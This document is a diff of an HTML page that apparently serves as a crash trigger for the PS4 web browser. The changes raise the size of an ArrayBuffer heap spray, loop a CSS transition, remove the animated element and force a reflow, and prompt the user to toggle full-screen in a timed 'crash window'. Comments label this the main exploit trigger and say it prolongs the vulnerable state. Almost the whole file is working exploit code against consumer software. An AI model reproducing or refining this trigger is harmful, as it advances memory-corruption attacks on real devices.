@@ -1,14 +1,16 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>PS4 Full-Screen Crash (User-Triggered)</title>
+  <title>PS4 Full-Screen Crash Test</title>
   <style>
     #box {
-      width: 100px; height: 100px;
+      width: 100px;
+      height: 100px;
       background: red;
       transition: transform 0.5s linear;
       position: absolute;
-      left: 0; top: 50%;
+      left: 0;
+      top: 50%;
     }
     #status {
       font-family: Arial;
@@ -20,62 +22,53 @@
       left: 0;
       z-index: 9999;
     }
-    #btn {
-      padding: 10px;
-      font-size: 20px;
-      position: fixed;
-      bottom: 20px;
-      left: 20px;
-      z-index: 10000;
-    }
   </style>
 </head>
-<body style="background: #000; height: 200vh;">
+<body style="background: #000; height: 200vh;"> <!-- Extra height for scrolling -->
   <div id="box"></div>
-  <div id="status">[1] Click "START" to begin</div>
-  <button id="btn">START</button>
+  <div id="status">CLICK TO START | WAIT FOR 'CRASH NOW!'</div>
 
   <script>
     const box = document.getElementById('box');
     const status = document.getElementById('status');
-    const btn = document.getElementById('btn');
+    let isTransitioning = false;
 
-    // Lightweight heap spray (no freezes)
+    // Heap spray to increase memory pressure
     function heapSpray() {
       window.spray = [];
-      for (let i = 0; i < 100; i++) {
+      for (let i = 0; i < 500; i++) {
         window.spray.push(new ArrayBuffer(0x100));
       }
     }
 
-    // Start transition loop
-    function startTransition() {
+    // Reset box position and restart transition
+    function restartTransition() {
       box.style.transform = 'translateX(0)';
-      setTimeout(() => box.style.transform = 'translateX(300px)', 10);
+      setTimeout(() => {
+        box.style.transform = 'translateX(300px)';
+        isTransitioning = true;
+        status.textContent = "TRANSITIONING... WAIT FOR 'CRASH NOW!'";
+      }, 10);
     }
 
-    // Main exploit
+    // Main exploit trigger
     function triggerExploit() {
       heapSpray();
-      status.textContent = "[2] Transition running...";
-      
-      // Loop transition every 1 second
-      setInterval(startTransition, 1000);
+      restartTransition();
 
-      // Update button to enter full-screen
-      btn.textContent = "ENTER FULL-SCREEN NOW";
-      btn.onclick = () => {
-        document.documentElement.requestFullscreen()
-          .then(() => {
-            status.textContent = "[3] CRASH TIME! EXIT FULL-SCREEN NOW!";
-            // No programmatic exit (let user do it manually)
-          })
-          .catch(e => status.textContent = "Fullscreen failed: " + e);
-      };
+      // Loop the transition to prolong vulnerable state
+      setInterval(restartTransition, 1000);
+
+      // Schedule the forced reflow + crash window
+      setTimeout(() => {
+        status.textContent = "CRASH NOW! ENTER/EXIT FULL-SCREEN!";
+        box.remove();
+        document.body.offsetHeight; // Force reflow
+      }, 800); // Adjusted delay for PS4's slow full-screen
     }
 
-    // Start on button click
-    btn.addEventListener('click', triggerExploit, { once: true });
+    // Start on click
+    document.body.addEventListener('click', triggerExploit);
   </script>
 </body>
 </html>
